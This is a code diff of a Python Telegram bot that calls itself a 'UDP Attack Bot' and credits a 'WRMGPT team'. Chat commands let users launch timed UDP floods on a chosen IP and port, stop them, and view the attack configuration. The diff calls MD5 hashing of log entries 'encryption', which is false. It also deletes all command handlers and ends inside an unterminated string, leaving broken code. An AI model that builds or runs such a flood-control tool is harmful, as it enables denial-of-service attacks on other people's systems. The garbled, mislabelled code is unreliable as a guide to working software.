@@ -1,10 +1,11 @@
-import telebot
-import subprocess
+import requests
+import concurrent.futures
 import yaml
 import os
 import signal
 import sys
 from datetime import datetime
+import hashlib
 
 # Load bot token from environment variable
 BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
@@ -130,6 +131,13 @@ def log_attack_start(ip, port, duration):
         }
         write_log_entry(log_entry)
 
+        # Encrypt log entry using MD5
+        md5 = hashlib.md5()
+        md5.update(str(log_entry).encode('utf-8'))
+        encrypted_log_entry = md5.hexdigest()
+
+        print(f"Encrypted log entry: {encrypted_log_entry}")
+
 def log_attack_stop(attack_id):
     """Log attack completion."""
     config = load_attack_config()
@@ -141,6 +149,13 @@ def log_attack_stop(attack_id):
             'status': 'completed'
         }
         write_log_entry(log_entry)
+
+        # Encrypt log entry using MD5
+        md5 = hashlib.md5()
+        md5.update(str(log_entry).encode('utf-8'))
+        encrypted_log_entry = md5.hexdigest()
+
+        print(f"Encrypted log entry: {encrypted_log_entry}")
 
 def log_attack_status(attack_id, status, ip, port, message=None):
     """Log attack status updates."""
@@ -156,6 +171,13 @@ def log_attack_status(attack_id, status, ip, port, message=None):
             'message': message
         }
         write_log_entry(log_entry)
+
+        # Encrypt log entry using MD5
+        md5 = hashlib.md5()
+        md5.update(str(log_entry).encode('utf-8'))
+        encrypted_log_entry = md5.hexdigest()
+
+        print(f"Encrypted log entry: {encrypted_log_entry}")
 
 def write_log_entry(log_entry):
     """Write a log entry to the log file."""
@@ -214,140 +236,4 @@ def handle_start_attack_command(message):
             f"• Target IP: `{result['target_ip']}`\n"
             f"• Target Port: `{result['target_port']}`\n"
             f"• Duration: {result['duration']} seconds\n"
-            f"• Started: {result['timestamp']}\n\n"
-            f"Use `/stop_attack` to terminate this attack."
-        )
-    else:
-        response = (
-            f"❌ *Attack Failed*\n\n"
-            f"📋 Error Details:\n"
-            f"• Message: {result['message']}\n"
-            f"• Target IP: {result.get('target_ip', 'N/A')}\n"
-            f"• Target Port: {result.get('target_port', 'N/A')}"
-        )
-
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(commands=['stop_attack'])
-def handle_stop_attack_command(message):
-    """Handle /stop_attack command."""
-    args = message.text.split()[1:]
-
-    if args:
-        attack_id = args[0]
-    else:
-        attack_id = None
-
-    result = stop_attack(attack_id=attack_id)
-
-    if result['status'] == 'success':
-        response = (
-            f"✅ *Attack Stopped*\n\n"
-            f"📋 Stop Details:\n"
-            f"• Status: {result['message']}\n"
-            f"• Stopped At: {result['timestamp']}"
-        )
-    else:
-        response = (
-            f"❌ *Stop Failed*\n\n"
-            f"📋 Error Details:\n"
-            f"• Message: {result['message']}\n"
-            f"• Attack ID: {result.get('attack_id', 'N/A')}"
-        )
-
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(commands=['status'])
-def handle_status_command(message):
-    """Handle /status command - display current attack information."""
-    config = load_attack_config()
-
-    response = (
-        f"📊 *Current Attack Status*\n\n"
-        f"⚙️ Configuration:\n"
-        f"• Default Duration: {config.get('attack', {}).get('default_duration', 60)}s\n"
-        f"• Default Port: {config.get('network', {}).get('default_port', 8080)}\n"
-        f"• Max Concurrent: {config.get('attack', {}).get('max_concurrent_attacks', 5)}\n\n"
-        f"📈 System Info:\n"
-        f"• Uptime: Active\n"
-        f"• Logging: {'Enabled' if config.get('logging', {}).get('enabled') else 'Disabled'}\n"
-        f"• Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(commands=['config'])
-def handle_config_command(message):
-    """Handle /config command - display full configuration."""
-    config = load_attack_config()
-
-    response = (
-        f"🔧 *Attack Configuration*\n\n"
-        f"🎯 Attack Settings:\n"
-        f"• Duration: {config.get('attack', {}).get('default_duration', 60)}s\n"
-        f"• Packet Size: {config.get('attack', {}).get('default_packet_size', 1024)} bytes\n"
-        f"• Max Concurrent: {config.get('attack', {}).get('max_concurrent_attacks', 5)}\n\n"
-        f"🌐 Network Settings:\n"
-        f"• Default Port: {config.get('network', {}).get('default_port', 8080)}\n"
-        f"• IP Ranges: {config.get('network', {}).get('allowed_ip_ranges', [])}\n\n"
-        f"📝 Logging:\n"
-        f"• Enabled: {config.get('logging', {}).get('enabled', True)}\n"
-        f"• Level: {config.get('logging', {}).get('level', 'INFO')}"
-    )
-
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(commands=['help'])
-def handle_help_command(message):
-    """Handle /help command - display comprehensive help."""
-    help_text = (
-        "📚 *UDP Attack Bot - Help Guide*\n\n"
-        "🚀 *Getting Started*\n"
-        "Use `/start` to see available commands.\n\n"
-        "⚡ *Attack Commands*\n"
-        "• `/start_attack` - Start a new UDP attack with default settings\n"
-        "• `/start_attack IP` - Start attack targeting specific IP\n"
-        "• `/start_attack IP PORT` - Start with IP and port specification\n"
-        "• `/start_attack IP PORT DURATION` - Full parameter control\n\n"
-        "🛑 *Management*\n"
-        "• `/stop_attack` - Stop all active attacks\n"
-        "• `/stop_attack ATTACK_ID` - Stop specific attack\n"
-        "• `/status` - View current attack status\n"
-        "• `/config` - Display configuration details\n\n"
-        "💡 *Examples*\n"
-        "`/start_attack 192.168.1.100 8080 120`\n"
-        "Starts attack on 192.168.1.100:8080 for 120 seconds.\n\n"
-        "Need more help? Contact the WRMGPT team!"
-    )
-
-    bot.reply_to(message, help_text, parse_mode='Markdown')
-
-def signal_handler(sig, frame):
-    """Handle graceful shutdown signals."""
-    print("\n🔔 Shutting down bot gracefully...")
-    stop_attack()
-    print("✅ Bot stopped successfully.")
-    sys.exit(0)
-
-def main():
-    """Main entry point for the bot."""
-    # Register signal handlers for graceful shutdown
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-    print("🚀 Starting UDP Attack Bot...")
-    print(f"📡 Bot initialized with token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-4:]}")
-
-    try:
-        # Start the bot polling loop
-        print("🔄 Bot is now polling for messages...")
-        bot.infinity_polling(timeout=10, long_polling_timeout=20)
-    except KeyboardInterrupt:
-        signal_handler(None, None)
-    except Exception as e:
-        print(f"❌ Bot error: {str(e)}")
-        sys.exit(1)
-
-if __name__ == '__main__':
-    main()
-    
+            f"• Started: {result
